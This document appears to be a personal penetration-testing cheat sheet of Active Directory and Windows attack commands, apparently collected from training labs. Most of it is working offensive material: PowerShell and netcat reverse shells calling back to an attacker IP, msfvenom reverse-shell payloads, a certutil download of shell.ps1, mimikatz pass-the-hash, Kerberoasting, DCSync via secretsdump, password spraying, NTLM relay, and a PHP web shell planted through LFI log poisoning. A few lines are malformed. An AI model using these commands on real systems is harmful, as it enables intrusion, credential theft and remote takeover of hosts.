# TOC
- [Tools](#tools)
- [URLs](#urls)
- [Training](#training)
- [OSINT](#osint)
- [setup](#setup)
- [Hashcat](#hashcat)
- [John](#john)
- [xfreerdp](#xfreerdp)
- [remmina](#remmina)
- [ssh](#ssh)
- [socat](#socat)
- [TFTP](#tftp)
- [scp](#scp)
- [nmap](#nmap)
- [fping](#fping)
- [enum4linux](#enum4linux)
- [enum4linux-ng](#enum4linux-ng)
- [tcpdump](#tcpdump)
- [Responser](#responder)
- [ffuf](#ffuf)
- [nc](#nc)
- [netstat](#netstat)
- [ss](#ss)
- [Windows Built-In](#windows-built-in)
- [Powerview](#powerview)
- [Metasploit](#metasploit)
- [setspn](#setspn)
- [samba](#samba)
  - [smbclient](#smbclient)
  - [rpcclinet](#rpcclient)
- [mimikatz](#mimikatz)
- [Rebeus](#rebeus)
- [crackmapexec](#crackmapexec)
- [kerbrute](#kerbrute)
- [impacket](#impacket)
  - [GetNPUsers.py](#getnpuserspy)
  - [GetUserSPNs.py](#getuserspnspy)

---

# Tools
https://github.com/GhostPack/Seatbelt  
https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
https://github.com/wavestone-cdt/powerpxe/blob/master/PowerPXE.ps1  
https://github.com/wavestone-cdt/powerpxe/tree/master  
https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/  
https://github.com/cube0x0/CVE-2021-1675/tree/main  
https://pypi.org/project/requests-ntlm/  

# URLs
https://zsh-prompt-generator.site/
https://bash-prompt-generator.org/

- shell
https://explainshell.com/

- Windows Server Core
https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core

- Get-Service
https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4

- vnstat command
https://humdi.net/vnstat/

- EyeWitness
EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
https://github.com/RedSiege/EyeWitness
https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/

- DREAD_(risk_assessment_model)
https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)

- Nessus Attack Scripting Language
https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language

- Filesystem Hierarchy Standard (FHS)
https://www.pathname.com/fhs/

---

# Traning
## GOAD
https://github.com/Orange-Cyberdefense/GOAD

---

# OSINT
- https://haveibeenpwned.com/
- https://www.dehashed.com/
## spiderfoot
https://github.com/smicallef/spiderfoot

---

# setup
- impacket
```
$ pa3
$ pip install impacket
# test
$ secretsdump.py -h
$ which secretsdump.py
```
- python
```zsh
$ pip install requests-ntlm
```

- slapd(OpenLDAP)
```zsh
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

- remmina
https://remmina.org/how-to-install-remmina/
```zsh
$ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
```

---

# Hashcat
tag: Misc
https://hashcat.net/wiki/doku.php?id=example_hashes 
```zsh
$ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
$ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
$ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
$ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
```

# John
tag: Misc

# xfreerdp
tag: RDP
```zsh
$ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:TestPassword /dynamic-resolution
$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:'P@$$W0rd' /dynamic-resolution
# bad
## $ has a special meaning
## $ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:P@$$W0rd /dynamic-resolution
```
`/dynamic-resolution` option may not work well.

# Remmina
tag: RDP
```zsh
$ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
```

# ssh
```zsh
$ ssh HOGE.com\\TestUser@TestHost.HOGE.com
$ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

# socat
```zsh
$ socat TCP4-LISTEN:13514,fork TCP4:TestTargetHost.HOGE.com:3389
```

# TFTP
```zsh
$ tftp -i XXX.XXX.XXX.XXX GET "\Tmp\x64{8A98E259-D569-5C1B-A098-986F5B5736FF}.bcd" conf.bcd
$ tftp -i XXX.XXX.XXX.XXX GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

# scp
```zsh
$ scp TestUser@HOGE.com:C:/Users/TestUser/Documents/20240518062907_BloodHound.zip .
```

# nmap
```zsh
$ sudo nmap XXX.XXX.XXX.XXX -p49555 -sV
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p-
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p8080
$ sudo nmap -sV -sC -p139,445 172.16.5.5
$ sudo nmap -sV -sC -p 0-10000 172.16.5.5
$ sudo nmap -A -p- 172.16.5.5
$ sudo nmap -sV -p- 172.16.5.130
$ sudo nmap -sV -p- 172.16.5.225
```

# fping
```zsh
$ fping -asgq 172.16.5.0/23
```

# enum4linux
```zsh
# sudo echo 172.16.0.10 hoge.com >> /etc/hosts
$ enum4linux -a hoge.com | tee output_enum4linux_a_hoge-com.ans
$ enum4linux -a XXX.XXX.XXX.XXX | tee output_enum4linux_a_ip.ans
$ enum4linux -P XXX.XXX.XXX.XXX
$ enum4linux -U XXX.XXX.XXX.XXX | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

# enum4linux-ng
```zsh
$ enum4linux-ng -P 172.16.0.10 -oA my_output
$ cat my_output.json
```

# tcpdump  
tag: Initial Enumeration  
```zsh
$ sudo tcpdump -i ens224
```

# Responder  
tag: Initial Enumeration  
```zsh
$ sudo responder -I ens224 -A
$ sudo responder -I ens224
```

# ffuf  
```zsh
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
```

# nc  
tag: LDAP Pass-back Attacks
```zsh
$ sudo nc -lvnp LPORT
$ nc -lvp 389
```

# netstat  
```zsh
$ netstat -tuln
```

# ss  
```zsh
$ ss -tuln
$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
-t: Show TCP connections.
-u: Show UDP connections.
-l: Show only listening sockets.
-n: Show numerical addresses instead of resolving hostnames.
-4: IPv4
```

# Windows Built-In
```powershell
# one line
PS> powershell -nop -c "powershell command; powershell command...;"
PS> powershell -command "Start-Process -Verb runas cmd"
# check user
PS> whoami /user
PS> whoami /priv
# check OS
PS> wmic os list brief
# check Windows Version
PS> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumbe
# check alias
PS> get-alias | sls "*ipconfig*"
PS> Get-Alias | select -First 2
PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
# find a specific folder
PS> tree c:\
PS> tree c:\ /f | more
PS> tree c:\ /f | Select-String "TestString" -context 20, 10
# Enumerating Security Controls
PS> Get-MpComputerStatus
PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
PS> Find-LAPSDelegatedGroups
PS> Find-AdmPwdExtendedRights
PS> Get-LAPSComputers
# create credential
PS> $username = 'TestAdminUser'
PS> $password = 'TestAdminPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
# access
PS> New-PSSession -ComputerName TestHost.HOGE.com
PS> Enter-PSSession -ComputerName TestHost.HOGE.com
PS> Enter-PSSession -Computername TARGET -Credential $credential
## or
PS> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
# Reverse Shell
PS> $client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',RPORT);
PS> $stream = $client.GetStream()
PS> [byte[]]$bytes = 0..65535|%{0}
PS> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.PS> ASCIIEncoding).GetString($bytes,0, $i)
PS> $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +  (pwd).Path + '> '
PS> $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
PS> $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# Reverse Shell - One Line
PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5,888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# List SIDs for local users
PS> Get-WmiObject Win32_UserAccount | Select-Object Name, SID
# List SIDs for local groups
PS> Get-WmiObject Win32_Group | Select-Object Name, SID
# privilege check
PS> whoami /priv
# check ACL
PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder';
PS> icacls $sharedFolderPath /inheritance:r
PS> icacls .\"TestFolder"
PS> icacls c:\windows
PS> icacls c:\users
PS> $securityGroupName = 'TestGroup'
PS> icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
# Service
PS> Get-Service
PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
PS> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl
PS> Get-Service | ? {$_.Name -like "*Update*"} | select -First 2 | fl
PS> Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"
PS> Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl
PS> Get-Service -Name HogeService | fl
# Share
PS> Get-WmiObject Win32_Share | Select-Object Name, Path
PS> Get-SmbShare | Select-Object Name, Path
PS> New-Item -ItemType Directory -Path .\"TestShareFolder"
PS> New-SmbShare -Path .\ -Name "TestShareFolder"
PS> New-SmbShare -Path c:\ -Name "TestShareFolder" -FullAccess 'Everyone'
PS> New-SmbShare -Path C:\Users\TestUser\"TestShareFolder" -Name "TestShareFolder" -FullAccess 'Everyone'
## Specify the shared folder path and name
PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder'
PS> $shareName = 'TestShareName'
PS> $securityGroupName = 'TestGroup'
## Remove the default group from the share permissions
PS> Remove-SmbShare -Name $shareName -Force
## Create a new shared folder with specific permissions
PS> New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName
## Add the security group to the existing shared folder
### The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions.
### If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result.
PS> Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change
PS> net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
# Create a new local user
PS> New-LocalUser -Name $username -Password $password -FullName 'Test' -Description 'Description of the new user' -AccountNeverExpires
# local security group
PS> $groupName = 'TestNewGroup'
PS> New-LocalGroup -Name $groupName -Description 'Description of the new group'
PS> Add-LocalGroupMember -Group $groupName -Member 'TestUser'
# Shell
PS> $username = 'TestUser'
PS> $password = 'TestPassword'
PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS> $Opt = New-CimSessionOption -Protocol DCOM
PS> $Session =  New-Cimsession -ComputerName TestComputerHost.HOGE.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
# Memo
PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
```
## runas
```powershell
PS> runas /netonly /user:HOGE.com\TestUser cmd.exe
PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 4443"
```
## Import-Module ActiveDirectory
```powershell
PS> Import-Module ActiveDirectory
# User
PS> Get-ADUser -Identity TestUser -Properties *
PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
# Group
PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
# Change Password
PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
# Active Directory Object
PS> $ChangeDate = New-Object DateTime(2024, 01, 24, 12, 00, 00)
PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server HOGE.com
```

## sc.exe
```powershell
PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
```

## certutil.exe
```powershell
PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
```

## net.exe
```zsh
$ net use \\DC01\ipc$ "" /u:""
$ net user %username%
```

## WinRM
tag: remote access
```powershell
PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
```

# PowerView  
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```powershell
PS> Import-Module .\PowerView.ps1
# User
PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
# Group
PS> Get-DomainGroup -Identity "TestGroup" | select memberof
# ACL
PS> Find-InterestingDomainAcl
PS> $TestUserSid = Convert-NameToSid TestUser
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid} -Verbose
PS> $TestGroupSid = Convert-NameToSid "TestGroup"
PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $TestGroupSid}
```

# Metasploit
```zsh
# Metasploit
```zsh
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
$ msfvenom -l payloads
$ msfvenom -p java/jsp_shell_reverse_tcp --list-options
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war
> set TARGETURI /manager/html
> set HttpPassword Tomcatadm
> set HttpUsername tomcat
> set LHOST 172.16.1.5
> set RHOSTS 172.16.1.11
> set RPORT 8080
# Download Module Manually
## search 50064.rb
## https://www.exploit-db.com/exploits/50064
$ cp ~/Downloads/50064.rb /usr/share/metasploit-framework/modules/my/50064.rb
$ msfconsole -m /usr/share/metasploit-framework/modules/
manual payload download
/usr/share/metasploit-framework/modules/exploits
/usr/share/metasploit-framework/modules/auxiliary
I try. only above folder can be impacted to search and use command
msf6 > reload_all
#
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.31 LPORT=4444 -o myservice.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.31 LPORT=4445 -f msi > myinstaller.msi

msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.65.31; set LPORT 4445;exploit"
#
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.31.110 LPORT=443 -f psh -o shell.ps1
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.31.110; set LPORT 443; exploit"
#
download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
```


$service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
... no display

https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
PowerShell 6.0 以降では、ServiceController オブジェクトに UserName、Description、DelayedAutoStart、BinaryPathName、StartupType の各プロパティが追加されています。

$PSVersionTable.PSVersion

Get-ExecutionPolicy -List



## next
# Specify the path to the HR subfolder
# Specify the security group name
# Remove the default group from NTFS permissions
# Disable inheritance before setting specific NTFS permissions
# Set NTFS permissions using icacls
$subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"

# Linux Buit-In
```zsh
# check service
$ systemctl list-units --type=service
$ systemctl show -p Type syslog.service
#
$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
# find index number - inode
$ stat sudoers
  File: sudoers
  Size: 755             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147627      Links: 1
Access: (0440/-r--r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-01-01 08:21:19.971766710 +0000
Modify: 2018-01-18 00:08:16.000000000 +0000
Change: 2021-08-03 12:08:36.494845988 +0000
 Birth: -
$ ls -i sudoers
147627 sudoers
# column command
## column command might be useful for a dman diplay of volatility 3
$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t

root         x  0     0      root               /root        /bin/bash
sync         x  4     65534  sync               /bin         /bin/sync
mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
```

# Internal Password Spraying - from Windows
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue

# BloodHound  
```powershell
PS> BloodHound.exe
# On GUI
## Upload Data ... zip file
## Check ... Analysis Tab
```
## SharpHound
```powershell
PS> .\SharpHound.exe -c All --zipfilename hoge
PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
```
## BloodHound.py
```zsh
$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns 172.16.5.6 -d hoge.com -c all
```

# Snaffer  
tag: scan
https://github.com/SnaffCon/Snaffler  
```powershell
PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
```
# Dsquery  
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)  
```powershell
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
```

# Samba
## smbclient
```zsh
$ smbclient -U TestUser -N XXX.XXX.XXX.xXX
```

## rpcclient
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration  
https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/  
```zsh
$ rpcclient -U "" -N XXX.XXX.XXX.XXX
rpcclient $> querydominfo
rpcclient $> enumdomusers
$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
$ grep Intern a.txt
group:[Interns] rid:[0xff0]
$
$ echo $((16#ff0))
4080
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
```

# smbmap
https://github.com/ShawnDEvans/smbmap  
SMB share enumeration across a domain. |  
```zsh
$ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
```

# setspn
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
```powershell
PS> setspn.exe -Q */*
PS> setspn.exe -Q vmware/HOGE.com
```

## targeting single user
```powershell
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

# mimikatz
```zsh
PS> mimikatz.exe
mimikatz # privilege::debug
mimikatz# base64 /out:true
mimikatz# kerberos::list /export
mimikatz# kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
```

# Rebeus
```powershell
PS> Rubeus.exe harvest /interval:30
PS> echo XXX.XXX.XXX.XXX HOGE.com >> C:\Windows\System32\drivers\etc\hosts
PS> Rubeus.exe brute /password:Password1 /noticket
PS> Rubeus.exe kerberoast /outfile:hashes.txt
```

# DCSync
```ps
# user: hoge
PS> Get-DomainUser -Identity hoge | select samaccountname,objectsid,memberof,useraccountcontrol |fl
# get sid
PS> sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

# SpoolSample.exe
```powershell
PS> SpoolSample.exe TestHost.HOGE.com "192.168.0.11"
```

# LDAP Pass-back Attacks
```zsh
$ sudo dpkg-reconfigure -p low slapd
```
- olcSaslSecProps.ldif
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

# Seatbelt
tag: scan
https://github.com/GhostPack/Seatbelt

# Lazagne
tag: scan

# sslstrip
https://github.com/moxie0/sslstrip

# PowerSploit
https://github.com/PowerShellMafia/PowerSploit

# PsExec
```powershell
PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
```

# Inveigh
## powershell
```powershell
PS> Import-Module .\Inveigh.ps1
PS> (Get-Command Invoke-Inveigh).Parameters
PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## c# exe
```powershell
PS> .\Inveigh.exe
```

# kerbrute
tag: Enumerating Users
```zsh
$ kerbrute userenum -d HOGE.com --dc 172.16.0.10 mylist.txt -o valid_ad_users
# $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
```

# crackmapexec
tag: Sighting In, Hunting For A User
```zsh
$ crackmapexec smb -h
$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
$ crackmapexec smb XXX.XXX.XXX.XXX --users
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword
$ set +H
$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
```

# impacket
## GetNPUsers.py
```zsh
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt hoge.com/ | tee output_GetNPUsers.ans
$ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./output_GetNPUsers.txt hoge.com/
```
## GetUserSPNs.py
```zsh
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo -request
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
$ GetUserSPNs.py HOGE.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -request -outputfile GetUserSPNs-py_hashcat.txt
# -> Hashcat
```
## ntlmrelayx.py
```zsh
$ ntlmrelayx.py -smb2support -t smb://XXX.XXX.XXX.XXX -debug
```
## smbserver.py
```zsh
$ smbserver.py -smb2support -username TestUser -password TestPassword TestRemoteAppearFolder TestLocalDirectory
```
## secretsdump.py
```zsh
$ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
$ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
$ secretsdump.py -sam sam.hive -system system.hive LOCAL
$ ls hoge-com_hashes*
```
## psexec.py
tag: shell
```zsh
$ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
$ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
```

# Evil-WinRM
```zsh
$ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
```

# ldapsearch
tag: LDAP
```zsh
$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

# windapsearch
tag: LDAP
```zsh
$ ./windapsearch.py -h
$ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u TestSpnAccountUser -p TestSpnAccountPassword -PU
```

# noPac
```zsh
$ git clone https://github.com/Ridter/noPac
```

# SharpGPOAbuse

# mcafee-sitelist-pwd-decryption
tag: mcafee
python3 version is released.
https://github.com/funoverip/mcafee-sitelist-pwd-decryption
```zsh
$ mcafee_sitelist_pwd_decrypt.py TestMcafeeCryptedPassword
```

# Memo
```
C:/ProgramDara/McAfee/Agent/DB/ma.db
```

# Story
```zsh
$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
$ cat result.txt | base64 -d > sqldev.kirbi
$ pa2
$ python ./kirbi2john.py sqldev.kirbi
$ cat crack_file
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ cat sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
```zsh
$ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
$ echo "~~~" | base64 -d | grep ".php"
# access to : hoge/index.php"
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
$ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
# php file
## <?php system($_GET["cmd"]); ?>
# User-Agent: <?php system($_GET['cmd']); ?>
$ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
```
```powershell
PS> Get-Content .\cert_templates.txt | sls -Pattern "(Template\[|Backup Operators|Remote Desktop Users|Domain Users|Client Authentication|CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)"
PS> Get-Content .\cert_templates.txt -Raw `
| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
| sls -Pattern "Template\[31\].*?Template\[32\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Foreach-Object {$_ -replace "aaaa", "`n"}
PS>
# not expected output
PS> certutil -v -template > cert_templates.txt
PS> net user <username> /domain
